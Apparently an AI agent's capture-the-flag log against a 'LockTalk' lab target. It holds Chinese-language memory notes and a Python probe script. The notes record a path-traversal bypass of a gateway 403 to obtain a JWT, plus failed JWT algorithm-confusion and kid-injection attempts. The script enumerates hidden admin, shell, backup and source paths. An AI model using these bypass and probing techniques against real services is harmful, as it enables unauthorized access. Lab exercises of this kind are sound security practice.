{"type": "tool_result", "data": {"tool": "memory_list", "call_id": "call_00_sHx013NmYNItDudAoRCO2351", "result": "[Memory 看板]\n- [evidence] mem_32c03eb5 (primary): LockTalk 靶机：路径 `/api/v1/../v1/get_ticket` 绕过网关 403 获取 JWT ticket。JWT 使用 RS256（alg=PS256），role=guest，exp 有时限。有个奇怪现象：响应键为 \"ticket: \"（冒号多了一个）。JWT 后端算法只允许特定算法，\"algorithm not allowed: HS256/HS512/HS384/none\"。\n- [fact] mem_372f8b90 (primary): LockTalk 题，目标 10.0.189.131:1337 (uWSGI Server，Flask)。三个 API：/api/v1/get_ticket（网关403拦截）、/api/v1/chat/{chatId}（需JWT）、/api/v1/flag（需JWT，401需要token）。前端JS已确认这些端点。\n- [failure] mem_a03a195d (primary): 网关403绕过路径混淆已测试约12种变体（双斜杠/大小写/编码/分号/../%2e），全部404或308重定向回403，未绕通。get_ticket的网关前缀匹配不可被简单路径混淆绕过。\n- [evidence] mem_42a3570a (primary): LockTalk 靶机：raw Authorization header（无 Bearer 前缀）可成功访问 /api/v1/chat/{id}。chat/1-10 均已读取，全是勒索谈判聊天记录，无 flag。已获得 guest JWT，用 raw token 访问 /api/v1/flag 返回 403 {\"guest user does not have the required authorization\"}。JWT header 为 {\"alg\":\"PS256\",\"typ\":\"JWT\"}（无 kid 参数），payload role=guest。\n- [failure] mem_dbc00997 (primary): LockTalk 后端 JWT 验证仅允许 PS256（可能也允许 RS256），明确拒绝 HS256/HS512/HS384/none，返回 \"algorithm not allowed\"。经典 HS256 算法混淆（用公钥做 HMAC 密钥）在此靶机无效。带 kid 头注入（指向 /etc/passwd、/root/public.pem 等）返回统一 401 Verification failed，未见文件读取差异。公钥路径探测（/static/*.pem、/.well-known/jwks.json、/api/v1/jwks、/public_key 等约25个路径）全部 404。"}}
{"type": "tool_call", "data": {"tool": "bash", "args": {"cmd": "cd /workspace/g-37 && cat > /tmp/probe1.py << 'EOF'\nimport urllib.request, json\nbase = 'http://10.0.189.131:1337'\n\ndef req_get(path, headers=None, method='GET', data=None):\n    req = urllib.request.Request(base+path, headers=headers or {}, method=method, data=data)\n    try:\n        r = urllib.request.urlopen(req, timeout=4)\n        return r.status, r.headers, r.read().decode(errors='replace')\n    except urllib.error.HTTPError as e:\n        return e.code, e.headers, e.read().decode(errors='replace')\n    except Exception as e:\n        return None, None, str(e)\n\n# 获取 token\nst, h, body = req_get('/api/v1/../v1/get_ticket')\ntoken = json.loads(body)['ticket: ']\nauth = {'Authorization': token}\n\n# 未受网关保护的后端路由探测（试试非 /api/v1/ 前缀的路径，网关可能只拦截 /api/v1/get_ticket）\npaths = [\n    '/health', '/healthz', '/status', '/debug', '/debug/',\n    '/server-status', '/info', '/version', '/ping',\n    '/admin', '/manage', '/console', '/shell',\n    '/v1/', '/api/', '/api/v1/', '/v2/',\n    '/internal', '/internal/panel', '/panel', '/dashboard',\n    '/config', '/config.json', '/settings',\n    '/backup', '/backup.zip', '/backup.tar.gz', '/db.sqlite',\n    '/test', '/dev', '/public',\n    '/source', '/src', '/app.py', '/main.py', '/requirements.txt',\n    '/flag', '/flag.txt', '/flag1.txt', '/api/v1/flag',\n]\nprint(\"=== 未受网关保护路由探测 ===\")\nfor p in paths:\n    st, h, body = req_get(p)\n    if st == 302:\n        print(f\"[302] {p} -> {h.get('Location')}\")\n    elif st == 200 and len(body) > 2 and body.strip() != '{}':\n        print(f\"[200] {p} ({h.get('Content-Type','')}): {body[:300]}\")\n    elif st in (500, 501):\n        print(f\"[{st}] {p}: {body[:300]}\")\n    elif st == 200 and len(body) <= 2:\n        print(f\"[200] {p} (empty/logic)\")\nprint(\"done\")\nEOF\necho \"diagnostic: cat of script before run\"\npython3 /tmp/probe1.py"}, "call_id": "call_01_gjj7w8UCrInSPvf0dBoI1900"}}
